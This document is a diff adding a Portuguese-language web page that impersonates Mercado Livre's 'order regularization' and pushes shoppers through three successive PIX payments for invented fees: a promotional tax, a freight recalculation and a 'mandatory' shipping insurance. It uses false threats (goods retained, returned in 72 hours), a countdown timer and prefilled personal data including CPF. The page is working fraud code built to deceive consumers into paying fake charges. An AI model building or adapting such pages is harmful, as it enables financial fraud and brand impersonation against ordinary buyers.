@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+<script src="/js/api-base.js"></script>
+<script src="/js/fb-pixel.js"></script>
+<script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Regularização do seu pedido — Mercado Livre</title>
+<meta name="robots" content="noindex, nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,sans-serif}
+  body{background:#f4f7f6;color:#1a1a1a;min-height:100vh}
+  input,select,textarea{font-size:16px}
+  header{background:#fff;border-bottom:1px solid #e8ecea;padding:12px 14px;display:flex;align-items:center;justify-content:space-between}
+  header img{height:22px}
+  header .etapa{font-size:11px;color:#0f9c74;font-weight:800;letter-spacing:.4px}
+  .prog{height:4px;background:#e5e7eb}
+  .prog>div{height:100%;background:#3483FA;transition:width .4s}
+  .wrap{max-width:560px;margin:0 auto;padding:16px 14px 40px}
+  .card{background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.07);padding:20px;margin-bottom:16px}
+  .badge{display:inline-block;color:#fff;font-size:11px;font-weight:800;padding:5px 10px;border-radius:5px;letter-spacing:.6px}
+  h1{font-size:22px;font-weight:800;margin:12px 0 8px;line-height:1.25;color:#232323}
+  .sub{font-size:14px;color:#DC2626;font-weight:700;margin-bottom:16px}
+  .exp{background:#F0FBF7;border:1px solid #CDEFE3;border-radius:10px;padding:12px;margin-bottom:14px;font-size:13px;color:#1c4c3d;line-height:1.55}
+  ul.b{list-style:none;margin:0 0 16px;font-size:13px;color:#333}
+  ul.b li{display:flex;gap:8px;align-items:flex-start;padding:6px 0;border-bottom:1px dashed #eee}
+  ul.b li:last-child{border-bottom:0}
+  ul.b span.c{color:#12b886;font-weight:800;flex-shrink:0}
+  .avs{background:#FFF6F6;border-left:3px solid #DC2626;padding:10px 12px;margin-bottom:16px;font-size:12px;color:#7F1D1D;line-height:1.5}
+  .val{display:flex;align-items:baseline;justify-content:space-between;background:#F0FBF7;border:1px solid #CDEFE3;padding:12px 14px;border-radius:10px;margin-bottom:14px}
+  .val .lb{font-size:12px;color:#0f9c74;font-weight:700}
+  .val .vv{font-size:26px;font-weight:800;color:#0f9c74}
+  .btn{width:100%;padding:15px;background:#3483FA;color:#fff;border:0;border-radius:10px;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit}
+  .btn:disabled{opacity:.7;cursor:wait}
+  .pular{display:block;margin:12px auto 0;background:transparent;border:0;color:#999;font-size:12px;text-decoration:underline;cursor:pointer}
+  .pix-box{text-align:center}
+  .pix-timer{font-size:30px;font-weight:800;color:#0f9c74;font-variant-numeric:tabular-nums;margin:4px 0 12px}
+  .pix-timer.red{color:#DC2626;animation:bl 1s ease-in-out infinite}
+  @keyframes bl{0%,100%{opacity:1}50%{opacity:.35}}
+  .qr-img{width:200px;height:200px;border:1px solid #e8ecea;border-radius:10px;padding:6px;background:#fff}
+  .cp-code{background:#F9FAFB;border:1px solid #E5E7EB;border-radius:8px;padding:10px;font-size:11px;color:#374151;word-break:break-all;font-family:monospace;margin:12px 0 10px;max-height:90px;overflow:hidden;text-align:left}
+  .cp-btn{width:100%;padding:13px;background:#0f9c74;color:#fff;border:0;border-radius:10px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit}
+  .cp-btn.ok{background:#059669}
+  .wait{margin-top:14px;padding:10px;background:#F0FBF7;border-radius:8px;font-size:12px;color:#1c4c3d;line-height:1.5;text-align:center}
+  .paid{text-align:center;padding:20px 0}
+  .paid .ci{width:72px;height:72px;background:#D1FAE5;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px}
+  .paid .ok{font-size:20px;font-weight:800;color:#059669;margin-bottom:8px}
+  .err{text-align:center;padding:10px 0}
+  .foot{text-align:center;font-size:11px;color:#9CA3AF;line-height:1.7}
+  .hidden{display:none}
+  .comp-up{background:#fff;border:1px dashed #cfd8dc;border-radius:10px;padding:14px;margin-top:14px;text-align:center}
+  .comp-up p{font-size:13px;color:#303235;margin-bottom:8px;line-height:1.5}
+  .comp-up strong{color:#0f9c74}
+  .comp-up label{display:inline-block;background:#F0FBF7;color:#0f9c74;border:1px solid #CDEFE3;padding:8px 14px;border-radius:8px;font-weight:700;font-size:13px;cursor:pointer}
+  .comp-up input[type=file]{display:none}
+  .comp-up .status{margin-top:8px;font-size:12px;font-weight:600}
+</style>
+</head>
+<body>
+<header>
+  <img src="/quiz/images/logo.webp" alt="celimax">
+  <div class="etapa" id="etapa">ETAPA 1 DE 3</div>
+</header>
+<div class="prog"><div id="progbar" style="width:33%"></div></div>
+<div class="wrap">
+  <div class="card" id="card"></div>
+  <div class="foot">Processamento seguro via PIX<br>Pagamento processado com segurança</div>
+</div>
+<script>
+const STEPS = {
+  '1': {
+    key: 'IMP-PROM',
+    amount: 2790,
+    badge: 'PENDÊNCIA FISCAL NO SEU PEDIDO',
+    badgeColor: '#DC2626',
+    titulo: 'Taxa de Imposto Promocional (TIP)',
+    subtitulo: 'Recolhimento obrigatório para emissão da nota fiscal do seu pedido.',
+    explicacao: 'Seu pagamento foi aprovado, porém o sistema identificou a incidência da Taxa de Imposto Promocional — tributo aplicado sobre produtos vendidos em campanha promocional. Sem esse recolhimento, a nota fiscal do seu pedido não é emitida e a mercadoria fica retida no centro de distribuição.',
+    bullets: [
+      'Alíquota promocional reduzida, cobrada uma única vez sobre o pedido.',
+      'Após o pagamento, a nota fiscal é emitida automaticamente em minutos.',
+      'O comprovante fica arquivado junto ao seu pedido para eventual fiscalização.',
+    ],
+    aviso: 'Se o imposto não for recolhido, o pedido fica retido no centro de distribuição e é devolvido ao remetente em até 72 horas.',
+    ctaLabel: 'Pagar imposto promocional - R$ 27,90',
+    next: '2',
+    msgSucesso: 'Imposto recolhido — nota fiscal liberada!'
+  },
+  '2': {
+    key: 'FRETE-REC',
+    amount: 1990,
+    badge: 'RECÁLCULO DE FRETE NECESSÁRIO',
+    badgeColor: '#0f9c74',
+    titulo: 'Recálculo de Frete por Região',
+    subtitulo: 'Complemento obrigatório para a transportadora aceitar a entrega.',
+    explicacao: 'Ao gerar a etiqueta de envio, a transportadora recalculou o frete com base no CEP informado e identificou uma diferença de valor por área de cobertura estendida. Esse complemento precisa ser quitado para que a etiqueta seja aceita e seu pedido siga para a rota de entrega.',
+    bullets: [
+      'Diferença de frete calculada pela própria transportadora, sem margem da loja.',
+      'Após o pagamento, a etiqueta é emitida e o rastreio liberado no mesmo dia.',
+      'Garante entrega no endereço informado, sem redirecionamento para agência.',
+    ],
+    aviso: 'Sem o complemento de frete, a etiqueta é cancelada e o pedido volta para a fila de expedição, com prazo de entrega indefinido.',
+    ctaLabel: 'Pagar recálculo de frete - R$ 19,90',
+    next: '3',
+    msgSucesso: 'Frete quitado — etiqueta de envio emitida!'
+  },
+  '3': {
+    key: 'SEG-ENVIO',
+    amount: 1490,
+    badge: 'ÚLTIMA ETAPA - SEGURO DE ENVIO',
+    badgeColor: '#12b886',
+    titulo: 'Taxa Obrigatória de Seguro de Envio',
+    subtitulo: 'Última etapa para liberar seu pedido para postagem hoje.',
+    explicacao: 'Os produtos são enviados em embalagem lacrada com seguro obrigatório contra extravio, violação e avaria. Essa taxa cobre o seguro do transporte e libera seu pedido na expedição prioritária de hoje. Sem ela, o pedido entra na fila padrão de postagem.',
+    bullets: [
+      'Cobertura total contra extravio, violação e avaria durante o transporte.',
+      'Reenvio gratuito em caso de qualquer problema na entrega.',
+      'Libera a postagem prioritária ainda hoje, em vez de 3 a 5 dias úteis.',
+    ],
+    aviso: 'A expedição prioritária está disponível apenas hoje. Sem o seguro, o pedido segue sem cobertura e na fila padrão de postagem.',
+    ctaLabel: 'Ativar seguro de envio - R$ 14,90',
+    next: 'sucesso',
+    msgSucesso: 'Seguro ativado — pedido liberado para postagem!',
+    permitirPular: true
+  }
+};
+
+const params = new URLSearchParams(location.search);
+const step = params.get('step') || '1';
+const cfg = STEPS[step] || STEPS['1'];
+document.getElementById('etapa').textContent = 'ETAPA ' + step + ' DE 3';
+document.getElementById('progbar').style.width = (parseInt(step, 10) / 3 * 100) + '%';
+
+const nome = params.get('nome') || params.get('name') || 'Cliente';
+const primeiroNome = nome.trim().split(/\s+/)[0] || 'Cliente';
+const cpfRaw = (params.get('cpf') || '').replace(/\D/g, '') || '00000000000';
+const emailParam = params.get('email') || (nome.toLowerCase().replace(/[^a-z0-9]+/g, '.') + '@gmail.com');
+const phoneParam = (params.get('phone') || '11999999999').replace(/\D/g, '');
+
+const card = document.getElementById('card');
+function fmtBRL(c){return (c/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'})}
+
+function renderIntro(){
+  card.innerHTML = `
+    <div class="badge" style="background:${cfg.badgeColor}">${cfg.badge}</div>
+    <h1>${cfg.titulo}</h1>
+    <div class="sub">${cfg.subtitulo}</div>
+    <div class="exp"><strong>Olá, ${primeiroNome}!</strong><br>${cfg.explicacao}</div>
+    <ul class="b">${cfg.bullets.map(b=>`<li><span class="c">✓</span><span>${b}</span></li>`).join('')}</ul>
+    <div class="avs">⚠️ <strong>Atenção:</strong> ${cfg.aviso}</div>
+    <div class="val"><div class="lb">Valor a pagar via PIX:</div><div class="vv">${fmtBRL(cfg.amount)}</div></div>
+    <button class="btn" id="btn-go">${cfg.ctaLabel}</button>
+    ${cfg.permitirPular ? '<button class="pular" id="btn-skip">Não desejo prosseguir com esta etapa</button>' : ''}
+  `;
+  document.getElementById('btn-go').addEventListener('click', gerarPix);
+  const sk = document.getElementById('btn-skip');
+  if (sk) sk.addEventListener('click', avancar);
+  try {
+    if (window.fbInitiateCheckout) window.fbInitiateCheckout(cfg.amount/100, { id: cfg.key, name: cfg.titulo, qty: 1 });
+    else if (window.fbq) window.fbq('track','InitiateCheckout',{value:cfg.amount/100,currency:'BRL',content_name:cfg.titulo,content_ids:[cfg.key],num_items:1});
+    if (window.utmifyTrack) window.utmifyTrack('InitiateCheckout', { value: cfg.amount/100, currency:'BRL', product: cfg.titulo });
+  } catch(e){}
+}
+
+function avancar(){
+  const p = new URLSearchParams(location.search);
+  if (cfg.next === 'sucesso') { location.href = '/celimax/obrigado.html'; return; }
+  p.set('step', cfg.next);
+  location.href = '/celimax/upsell.html?' + p.toString();
+}
+
+let seconds = 15*60, tickInt=null, pollInt=null;
+function stopAll(){ if(tickInt) clearInterval(tickInt); if(pollInt) clearInterval(pollInt); tickInt=null; pollInt=null; }
+
+async function gerarPix(){
+  const btn = document.getElementById('btn-go');
+  btn.disabled = true; btn.textContent = 'Gerando PIX...';
+  try {
+    const res = await fetch('/api/public/freepay-checkout', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        amount: cfg.amount,
+        productName: cfg.titulo,
+        isUpsell: true,
+        customer: {
+          name: nome,
+          email: emailParam,
+          phone: phoneParam,
+          document: { type: 'cpf', number: cpfRaw }
+        },
+        items: [{ name: cfg.titulo, price: cfg.amount/100, quantity: 1 }],
+        tracking: Object.assign({}, (window.getStoredUtms ? window.getStoredUtms() : {}), (window.fbTracking ? window.fbTracking() : {}))
+      })
+    });
+    const j = await res.json();
+    const pix = j?.data?.pix || j?.pix || {};
+    const copyPaste = pix.copy_paste || pix.qr_code;
+    if (!res.ok || !copyPaste) throw new Error(j?.error || 'Falha ao gerar PIX');
+    let qr = pix.qr_code_base64;
+    if (!qr) qr = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(copyPaste);
+    else if (!String(qr).startsWith('data:')) qr = 'data:image/png;base64,' + qr;
+    renderPix(qr, copyPaste, j?.data?.id || pix.id);
+  } catch(e) {
+    card.innerHTML = `<div class="err"><div style="font-size:40px;margin-bottom:12px">❌</div><div style="font-size:16px;font-weight:700;color:#DC2626;margin-bottom:8px">Não foi possível gerar o PIX</div><div style="font-size:13px;color:#666;margin-bottom:16px">${e.message||''}</div><button class="btn" onclick="location.reload()">Tentar novamente</button></div>`;
+  }
+}
+
+function renderPix(qr, copyPaste, txId){
+  card.innerHTML = `
+    <div class="pix-box">
+      <div class="badge" style="background:#FEF3C7;color:#78350F">AGUARDANDO PAGAMENTO</div>
+      <div style="font-size:15px;font-weight:700;margin-top:10px">PIX gerado — pague em até</div>
+      <div class="pix-timer" id="timer">15:00</div>
+      <img class="qr-img" src="${qr}" alt="QR Code PIX">
+      <div style="font-size:12px;color:#666;margin-top:8px">ou copie o código PIX abaixo:</div>
+      <div class="cp-code">${copyPaste}</div>
+      <button class="cp-btn" id="cp-btn">Copiar código PIX</button>
+      <div class="wait">Aguardando confirmação automática do banco... Não feche esta página.</div>
+      <div class="comp-up hidden" id="comp-up">
+        <p><strong>Já pagou e ainda não foi redirecionado?</strong><br>Anexe seu comprovante abaixo</p>
+        <label for="comp-file">📎 Anexar comprovante</label>
+        <input type="file" id="comp-file" accept="image/*,application/pdf">
+        <div class="status" id="comp-status"></div>
+      </div>
+    </div>
+  `;
+  document.getElementById('cp-btn').addEventListener('click', () => copyPix(copyPaste));
+  tickInt = setInterval(() => {
+    seconds--;
+    const mm = String(Math.floor(seconds/60)).padStart(2,'0');
+    const ss = String(seconds%60).padStart(2,'0');
+    const t = document.getElementById('timer');
+    if (t) { t.textContent = mm+':'+ss; if(seconds<120) t.classList.add('red'); }
+    if (seconds <= 0) stopAll();
+  }, 1000);
+
+  setTimeout(() => {
+    const up = document.getElementById('comp-up');
+    if (up) up.classList.remove('hidden');
+    const fi = document.getElementById('comp-file');
+    if (fi) fi.addEventListener('change', (e) => enviarComp(e, txId));
+  }, 60000);
+
+  pollInt = setInterval(async () => {
+    try {
+      const r = await fetch('/api/public/payment-status?gateway=freepay&transaction_id=' + encodeURIComponent(txId));
+      const j = await r.json();
+      if (j?.status === 'paid' || j?.status === 'approved') {
+        stopAll();
+        try {
+          if (window.fbPurchase) window.fbPurchase(cfg.amount/100, txId);
+          if (window.gadsPurchase) window.gadsPurchase(cfg.amount/100, txId);
+        } catch(e){}
+        renderPaid(txId);
+      }
+    } catch(e){}
+  }, 5000);
+}
+
+function copyPix(text){
+  const btn = document.getElementById('cp-btn');
+  const done = () => { btn.textContent = '✓ Copiado!'; btn.classList.add('ok'); setTimeout(()=>{btn.textContent='Copiar código PIX';btn.classList.remove('ok');},2000); };
+  function fb(){ const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');done();}catch(e){}ta.remove(); }
+  if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(fb);
+  else fb();
+}
+
+async function enviarComp(e, txId){
+  const f = e.target.files && e.target.files[0]; if (!f) return;
+  const st = document.getElementById('comp-status');
+  st.textContent = 'Enviando comprovante...'; st.style.color = '#0f9c74';
+  const fd = new FormData(); fd.append('file', f); fd.append('transaction_id', String(txId));
+  try {
+    const r = await fetch('/api/public/upload-comprovante', { method:'POST', body: fd });
+    const j = await r.json();
+    if (j?.success) { st.textContent='✓ Comprovante enviado! Nossa equipe já foi notificada.'; st.style.color='#059669'; }
+    else { st.textContent='Erro ao enviar: '+(j?.message||'tente novamente'); st.style.color='#c0392b'; }
+  } catch(err) { st.textContent='Erro de conexão, tente novamente.'; st.style.color='#c0392b'; }
+}
+
+function renderPaid(txId){
+  card.innerHTML = `
+    <div class="paid">
+      <div class="ci">✅</div>
+      <div class="ok">${cfg.msgSucesso}</div>
+      <div style="font-size:13px;color:#555;line-height:1.6">Protocolo: <strong>${txId||'—'}</strong><br>Redirecionando...</div>
+    </div>
+  `;
+  setTimeout(avancar, 2500);
+}
+
+renderIntro();
+</script>
+</body>
+</html>
